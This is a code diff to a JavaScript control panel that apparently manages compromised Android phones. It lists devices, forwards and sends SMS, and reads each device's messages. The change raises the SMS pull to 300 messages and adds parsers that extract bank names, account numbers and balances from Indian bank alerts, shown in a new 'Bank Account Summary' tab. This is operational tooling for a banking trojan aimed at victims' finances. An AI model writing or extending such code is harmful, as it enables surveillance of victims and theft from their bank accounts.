@@ -1,9 +1,9 @@
-var PANEL_BUILD=9;
+var PANEL_BUILD=10;
 var AUTH_URL='';
 var SMS_TOKEN_URL='';
 var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
-var activeListeners={}, window_sms=[];
+var activeListeners={}, window_sms=[], window_banks=[];
 var ACTIVE_FB_KEY='rbl_active_fb_m';
 var CLIENTS_CACHE_KEY='rbl_clients_cache_v2';
 var CLIENTS_CACHE_TTL=6*60*60*1000;
@@ -444,7 +444,7 @@ function updatePanelVersionBadge(){
   if(window.RebelAndroid&&RebelAndroid.getPanelVersion){
     try{v=RebelAndroid.getPanelVersion()||v;}catch(e){}
   }
-  el.textContent='Panel v'+v+' · Solid UI';
+  el.textContent='Panel v'+v+' · Bank SMS';
 }
 function updateStats(){
   var l=getFilteredDevs();
@@ -554,6 +554,7 @@ function renderDeviceView(){
     '<input class="form-input" id="fwFilters" placeholder="Filters (comma separated)"/>'+
     '<button class="btn-send" onclick="saveForward()" style="margin-top:10px">Save Forwarding</button>'+
     '<div id="fwList" class="data-list" style="margin-top:12px"></div></div>'+
+    '<button class="btn-send" onclick="switchTab(\'bank\',document.querySelector(\'.nav-item[data-tab=bank]\'))" style="margin-top:14px">🏦 Bank Account Summary</button>'+
     '<div style="margin-top:10px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>';
   ensureDevTabLoaded('sim');
 }
@@ -603,12 +604,136 @@ function normalizeSms(m){
   if(!body)return null;
   return{address:m.address||m.sender||m.from||m.number||'?',body:body,
     date_readable:m.date_readable||m.dateTime||m.time||'—',
+    date_ms:parseSmsDateMs(m),
     type:String(m.type||m.direction||'inbox').toLowerCase()};
+}
+function parseSmsDateMs(m){
+  if(!m||typeof m!=='object')return 0;
+  var ts=m.date||m.timestamp||m.time_ms||m.received_at||0;
+  if(typeof ts==='number'&&ts>1e11)return ts;
+  if(typeof ts==='number'&&ts>1e9)return ts*1000;
+  var p=Date.parse(String(m.date_readable||m.dateTime||m.time||''));
+  return isNaN(p)?0:p;
+}
+function parseInrAmount(s){
+  if(s==null)return null;
+  var n=parseFloat(String(s).replace(/,/g,''));
+  return isNaN(n)||n<0||n>1e12?null:n;
+}
+var BANK_NAME_MAP=[
+  {re:/state\s*bank|sbi\b|sbin/i,name:'State Bank of India'},
+  {re:/hdfc/i,name:'HDFC Bank'},{re:/icici/i,name:'ICICI Bank'},{re:/axis/i,name:'Axis Bank'},
+  {re:/kotak/i,name:'Kotak Mahindra Bank'},{re:/punjab\s*national|pnb\b/i,name:'Punjab National Bank'},
+  {re:/bank\s*of\s*baroda|bob\b/i,name:'Bank of Baroda'},{re:/canara/i,name:'Canara Bank'},
+  {re:/union\s*bank/i,name:'Union Bank'},{re:/idbi/i,name:'IDBI Bank'},{re:/yes\s*bank/i,name:'Yes Bank'},
+  {re:/indusind/i,name:'IndusInd Bank'},{re:/federal\s*bank/i,name:'Federal Bank'},
+  {re:/bandhan/i,name:'Bandhan Bank'},{re:/indian\s*bank/i,name:'Indian Bank'},
+  {re:/idfc/i,name:'IDFC FIRST Bank'},{re:/rbl\s*bank/i,name:'RBL Bank'}
+];
+var BANK_SENDER_MAP=[
+  ['SBIINB','State Bank of India'],['SBIPSG','State Bank of India'],['SBI','State Bank of India'],
+  ['HDFCBK','HDFC Bank'],['HDFC','HDFC Bank'],['ICICIB','ICICI Bank'],['ICICIT','ICICI Bank'],
+  ['AXISBK','Axis Bank'],['KOTAKB','Kotak Mahindra Bank'],['PNBSMS','Punjab National Bank'],
+  ['BOBSMS','Bank of Baroda'],['CANBNK','Canara Bank'],['UNIONB','Union Bank'],['IDBIBK','IDBI Bank']
+];
+function inferBankName(body,address){
+  var text=String(body||'')+' '+String(address||'');
+  var i;for(i=0;i<BANK_NAME_MAP.length;i++){if(BANK_NAME_MAP[i].re.test(text))return BANK_NAME_MAP[i].name;}
+  var a=String(address||'').toUpperCase().replace(/[^A-Z0-9]/g,'');
+  for(i=0;i<BANK_SENDER_MAP.length;i++){if(a.indexOf(BANK_SENDER_MAP[i][0])>=0)return BANK_SENDER_MAP[i][1];}
+  return null;
+}
+function extractAccountFromSms(body){
+  var b=String(body||''),patterns=[
+    /(?:a\/c|acct|account)\s*(?:no\.?|number)?\s*(?:x{2,}|\*{2,}|X{2,})*(\d{4,})/i,
+    /(?:x{4,}|\*{4,}|X{4,})(\d{4})\b/,
+    /(?:a\/c|acct)\s*(?:no\.?)?\s*(\d{8,18})/i
+  ],i,m;
+  for(i=0;i<patterns.length;i++){m=b.match(patterns[i]);if(m&&m[1])return m[1];}
+  return null;
+}
+function extractBalanceFromSms(body){
+  var b=String(body||''),patterns=[
+    /(?:avl|available)\s*bal(?:ance)?[:\s-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
+    /bal(?:ance)?\s*(?:is|:|-)\s*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
+    /(?:inr|rs\.?|₹)\s*([\d,]+(?:\.\d{1,2})?)\s*(?:is\s+)?(?:avl|available|your)/i,
+    /(?:closing|clear)\s*bal(?:ance)?[:\s]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i
+  ],i,m,amt;
+  for(i=0;i<patterns.length;i++){
+    m=b.match(patterns[i]);
+    if(m&&m[1]){amt=parseInrAmount(m[1]);if(amt!=null)return amt;}
+  }
+  return null;
+}
+function isBankSms(body,address){
+  var t=(String(body||'')+' '+String(address||'')).toLowerCase();
+  if(/credited|debited|withdrawn|deposited|avl\s*bal|available\s*bal|a\/c|acct|imps|neft|rtgs|upi|txn|transaction|bal\s*is/i.test(t))return true;
+  if(/sbi|hdfc|icici|axis|kotak|pnb|bob|canara|union|idbi|yes\s*bank|indusind|bank\b/i.test(t))return true;
+  return false;
+}
+function maskBankAccount(acct){
+  if(!acct||acct==='Unknown')return 'Unknown';
+  var d=String(acct).replace(/\D/g,'');
+  if(d.length<=4)return d||'Unknown';
+  return 'XXXX'+d.slice(-4);
+}
+function formatInr(n){
+  if(n==null||isNaN(n))return '—';
+  return '₹ '+Number(n).toLocaleString('en-IN',{minimumFractionDigits:2,maximumFractionDigits:2});
+}
+function parseBankAccountsFromSms(smsList){
+  var map={},keys,k,row,bals,sum,i;
+  (smsList||[]).forEach(function(s){
+    if(!s||!s.body||!isBankSms(s.body,s.address))return;
+    var bal=extractBalanceFromSms(s.body);
+    if(bal==null)return;
+    var acct=extractAccountFromSms(s.body)||'Unknown';
+    var bank=inferBankName(s.body,s.address)||'Bank';
+    k=bank+'|'+acct;
+    if(!map[k])map[k]={bank:bank,account:acct,balances:[],latestMs:0,latestDate:''};
+    map[k].balances.push(bal);
+    var ms=s.date_ms||0;
+    if(ms>=map[k].latestMs){map[k].latestMs=ms;map[k].latestDate=s.date_readable||'';map[k].current=bal;}
+  });
+  keys=Object.keys(map);
+  return keys.map(function(key){
+    row=map[key];bals=row.balances;sum=0;
+    for(i=0;i<bals.length;i++)sum+=bals[i];
+    return{bank:row.bank,account:row.account,accountMask:maskBankAccount(row.account),
+      current:row.current!=null?row.current:bals[bals.length-1],average:sum/bals.length,
+      highest:Math.max.apply(null,bals),lowest:Math.min.apply(null,bals),count:bals.length,latestDate:row.latestDate};
+  }).sort(function(a,b){return a.bank.localeCompare(b.bank);});
+}
+function renderBankAccounts(){
+  var d=getSelDev(),listEl=document.getElementById('bankList'),emptyEl=document.getElementById('bankEmpty'),badge=document.getElementById('bankCountBadge');
+  if(!d){
+    if(emptyEl){emptyEl.classList.remove('hidden');emptyEl.innerHTML='<div class="ico">🏦</div>Select a device — SMS se bank balance auto load';}
+    if(listEl)listEl.innerHTML='';if(badge)badge.textContent='0 Banks';return;
+  }
+  window_banks=parseBankAccountsFromSms(window_sms);
+  if(badge)badge.textContent=window_banks.length+' Bank'+(window_banks.length===1?'':'s');
+  if(!window_banks.length){
+    if(emptyEl){emptyEl.classList.remove('hidden');emptyEl.innerHTML='<div class="ico">🏦</div>No bank SMS found<br><span style="font-size:11px;opacity:.6">SBI, HDFC, ICICI balance alerts yahan dikhenge</span>';}
+    if(listEl)listEl.innerHTML='';return;
+  }
+  if(emptyEl)emptyEl.classList.add('hidden');
+  if(!listEl)return;
+  listEl.innerHTML=window_banks.map(function(b){
+    return '<div class="bank-card"><div class="bank-card-top"><div class="bank-icon">🏦</div><div><div class="bank-name">'+esc(b.bank)+'</div><div class="bank-acct">A/C '+esc(b.accountMask)+'</div></div></div>'+
+      '<div class="bank-grid">'+
+      '<div class="bank-stat"><div class="bank-stat-lbl">CURRENT BALANCE</div><div class="bank-stat-val current">'+formatInr(b.current)+'</div></div>'+
+      '<div class="bank-stat"><div class="bank-stat-lbl">AVERAGE</div><div class="bank-stat-val">'+formatInr(b.average)+'</div></div>'+
+      '<div class="bank-stat"><div class="bank-stat-lbl">HIGHEST</div><div class="bank-stat-val">'+formatInr(b.highest)+'</div></div>'+
+      '<div class="bank-stat"><div class="bank-stat-lbl">LOWEST</div><div class="bank-stat-val">'+formatInr(b.lowest)+'</div></div>'+
+      '</div><div class="bank-meta">'+b.count+' balance SMS'+(b.latestDate?' · Latest: '+esc(b.latestDate):'')+'</div></div>';
+  }).join('');
 }
 function renderSmsFromData(data){
   var list=smsAsList(data).map(normalizeSms).filter(Boolean);
-  list.sort(function(a,b){return String(b.date_readable).localeCompare(String(a.date_readable));});
-  window_sms=list.slice(0,60);renderSms();
+  list.sort(function(a,b){return(b.date_ms||0)-(a.date_ms||0);});
+  window_sms=list.slice(0,300);
+  renderSms();
+  renderBankAccounts();
 }
 function renderSms(){
   var d=getSelDev(),el=document.getElementById('smsList');
@@ -645,7 +770,7 @@ function sendSms(){
   });
 }
 
-var TAB_ORDER=['home','device','sms','send'],_lastTab='home';
+var TAB_ORDER=['home','device','sms','bank','send'],_lastTab='home';
 function switchTab(name,btn){
   document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
   var screen=document.getElementById('screen-'+name);
@@ -657,9 +782,10 @@ function switchTab(name,btn){
     if(navBtn){navBtn.classList.add('active');moveNavGlow(navBtn);}
   }
   _lastTab=name;
-  if(name==='sms'&&selDev)loadSmsForDevice();
+  if((name==='sms'||name==='bank')&&selDev)loadSmsForDevice();
   if(name==='device')renderDeviceView();
   if(name==='send')updateSendForm();
+  if(name==='bank')renderBankAccounts();
 }
 function closeSideMenu(){
   var bg=document.getElementById('sideMenuBg'),menu=document.getElementById('sideMenu'),btn=document.getElementById('menuBtn');
